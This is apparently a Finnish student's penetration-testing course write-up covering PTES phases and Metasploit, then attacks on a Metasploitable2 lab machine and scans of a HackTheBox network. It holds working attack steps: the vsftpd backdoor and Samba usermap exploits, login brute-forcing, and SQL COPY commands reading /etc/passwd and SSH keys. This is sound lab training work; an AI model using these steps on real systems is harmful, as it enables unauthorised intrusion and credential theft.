# H5 | Sitting ducks | Metasploit & Metasploitable2

## z) Memot (Tehty 08/12/2020. Aivot skippasivat tämän jotenkin kun tein tehtäviä viikonloppuna.)

* Tunkeutumistestaus tietoturvan työkaluna
* Menestyminen paljonkin oikeiden tekniikoiden ja työkalujen käytön takana

* [PTES](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines)
* Esivaikutelma/Ennakkovuorovaikutus
* Scope/laajuus
* Tiedonkeruu / Tiedusteluvaihe
  * Passiivinen
  * Aktiivinen
  * Eniten aikaa vievin vaihe. Hyvin suunniteltu on puoliksi tehty.
* Uhkien mallintaminen
* Haavoittuvuusanalyysi
* Exploittaaminen & exploittaamisen jälkeiset toimenpiteet (foothold)
* Raportointi

* Lab-ympäristön tekeminen
  * Virtualisoitu
  
* Metasploit
  * Exploitit
  * Hyötykuormat
  * Auttajat/aputyökalut (Auxiliary)
  * Enkoodaajat/koodittajat
  * Muistissa oleva shelli (Meterpreter -ei ole aina mahdollisuus)

![msfff](https://github.com/mikorpi/Pentest-2020-Autumn/blob/main/H5/images/msf.jpeg)

## a) Metasploitable2 -maalikone

Laitoin host-only-networking päälle tätä varten.

Aloitetaan tiedustelu versioita skannaten top1000 porttia > `$ sudo nmap -sV metasploitable2IP`

![nmapsploit2](https://github.com/mikorpi/Pentest-2020-Autumn/blob/main/H5/images/msploit2_nmap.png)

Kuten kuvasta selviää, boksi on todella vulni. Avataan metasploitin konsoli!

Aloitin exploittaamisen katsomalla mitä haavoittuvuuksia ftp-palvelussa on. `msf6 > search vsftpd 2.3.4`. Löydetään heti takaovi exploitti. 

![ftproot](https://github.com/mikorpi/Pentest-2020-Autumn/blob/main/H5/images/ftp_root.png)

Vähintään yhtä helppoa kuin HackTheBox. Kuvassa näkyy kaikki oleellinen mitä tarvittiin eli ensinmäiseksi:
* etsitään haavoittuvuus `search`:illa.
* Asetetaan exploit `msf6 > use exploit/unix/ftp/vsftpd_234_backdoor`
* Näytetään vaihtoehdot `msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options`
* Jos kaikki kunnossa, exploitataan `exploit`-käskyllä.
* Rooted.

Seuraavaksi nappasin MYSQL-tietokantapalvelun. Versiona toimi `5.0.5` mikä on ikivanha. Samalla kaavalla mennään kuin aiemmin eli:
* `search mysql 5`-ehdolla etsitään moduuleita, näitä löyty 20 kappaletta. Valitaan `MYSQL Login Utility` mikä on bruteforce-hyökkäys.

![bfmysql5](https://github.com/mikorpi/Pentest-2020-Autumn/blob/main/H5/images/bforce_mysqlroot.png)

* `msf6 > use auxiliary/scanner/mysql/mysql_login` -> laitetaan se käyttöön.
* vaihtoehtoja on monia
* Sanalistana käytin perinteistä `rockyou.txt`:iä
* Selvisi että root:illa ei ole salasanaa.

MySQL 5.0.5:seen oli myös hyökkäys joka tuki meterpreteriä.

![adsads](https://github.com/mikorpi/Pentest-2020-Autumn/blob/main/H5/images/meterpreter.png)

**HUOM. RHOSTS ja LHOST on jotain aivan muuta kuin pitäisi. Otin tämän screenshotin kun olin jo siirtynyt b) ja c) tehtäviin.**
Meterpreter-hyötykuorma on DLL-injektio joka tuo interaktiivisen shellin. Se ei kirjoita mitään levylle vaan lojuu muistissa.

Kokeillaan seuraavaksi toisen tietokantapalvelun kuntoa, PostgreSQL. Versiona toimii nmapin mukaan `8.3.0 - 8.3.7`. Ymmärtäisin näin kyseisen nmap-tuloksen että nmap ei ole aivan varma mikä versio se on tuolta väliltä. What gives.

Käytetään `postgres_login`:inia. `msf6 > use auxiliary/scanner/postgres/postgres_login`

```metasploit
[-] 192.168.56.102:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
[-] 192.168.56.102:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
[-] 192.168.56.102:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
[-] 192.168.56.102:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)
[-] 192.168.56.102:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)
[-] 192.168.56.102:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)
[-] 192.168.56.102:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)
[+] 192.168.56.102:5432 - Login Successful: postgres:postgres@template1
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Eli käyttäjä postgres salasanalla postgres löytyy! Mennään katsomaan, eli hyökkäyskoneella > `psql -h metasploitable2IP -U postgresql` ja salasanaksi `postgresql`.

![soppakauha](https://github.com/mikorpi/Pentest-2020-Autumn/blob/main/H5/images/superuser.png)

Katotaan käyttäjätiedot `pg_user`:ista.
* Luodaan soppakauha-käyttäjä ja annetaan sille oikeuksia! (irrelevantti kohta, postgresql-käyttäjä on superoikeuksilla jo)
* Mitä seuraavaksi?

Viedään vaikka `/etc/passwd` **ilman shelliä**.
* Luodaan taulukko > `CREATE TABLE accoinfo (acot TEXT);`
* Kopioidaan `/etc/passwd` taulukkoon > `COPY accoinfo from '/etc/passwd';`
* Näytetään tulokset accoinfo-taulukosta > `select * from accoinfo where acot like '%bash%';`
* `%bash%`:illa selvitetään `/bin/bash`-shellin omaavat käyttäjät sillä niihin pääsee etänä logattua sisälle.

![acco](https://github.com/mikorpi/Pentest-2020-Autumn/blob/main/H5/images/accocopy.png)

Tällä tavoin voitaisiin myös napata `/etc/shadow` ja kokeilla salasanojen kestävyyttä JohntheRipper:illä tai muulla salasananmurtotyökalulla. Pienellä hienosäädöllä voidaan myös viedä SSH-avain.

* `CREATE TABLE ssh_avaimet (auth TEXT);`
* `COPY ssh_avaimet from '/root/.ssh/authorized_keys';`
* `select * from ssh_avaimet;`

```
ssh-rsa AAAAB3NzaC1yc2EEEEEBIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable
```

Samba toimii porteissa 139 ja 445. Koitetaan mennä 139-portin kautta sisään: 
* `msf6 > search samba 3` etsitään sopivaa sploittia.
* Moduuleita löytyy 20 kappaletta, napataan nro.11 `Samba "username map script" Command Execution`.
* `msf6 exploit(multi/samba/usermap_script) >`
* Hyötykuormana perinteinen reverse_netcat-sessio
* Juoksutetaan exploitti käskyllä `run`

![smbsearch](https://github.com/mikorpi/Pentest-2020-Autumn/blob/main/H5/images/smb_root.png)

Rooted.

## b) & c) ScanTheWeb | HackTheBox | MSFDB

Avataan msfconsole ja luodaan workspace `$ sudo msfconsole` ja `msf6 > workspace -a jokunimi`.

Skannataan HTB-verkko versioita enumeroiden.
* `msf6 > db_nmap -sV 10.10.10.1-254`
* `msf6 > services` - käskyllä näytetään versiot kannasta.
* Tällä hetkellä koneet `xx.xx.xx.196-219` ovat avoinna.

![dbnmap](https://github.com/mikorpi/Pentest-2020-Autumn/blob/main/H5/images/db_nmap.png)
 
 Maalikoneen `10.10.10.196`:n portissa 8000 sijaitseva `Werkzeug 0.14.1` on haavoittuvainen ainakin jos debuggauskonsoli on päällä. Vulni on RCE eli remote code execution.
 
 Myös maalikoneen `10.10.10.197` nginx-webbipalvelin versioltaan `1.14.2` on haavoittuvainen mm. DoS-hyökkäykselle. Version `1.1.17` URI-prosessoinnissa tapahtuva turvallisuuden ohitus voisi myös toimia tässä vanhemmassa versiossa.
 
 Maalikoneen `10.10.10.210` http-palvelu Microsoft IIS 8.5 on myös haavoittuvainen mm. XSS:älle ja sille löytyy valmis exploittikin ( tai pari ) metasploitista! Yksi niistä on [WebDAV Write Access Code Execetion](https://www.exploit-db.com/exploits/16471).
 
 
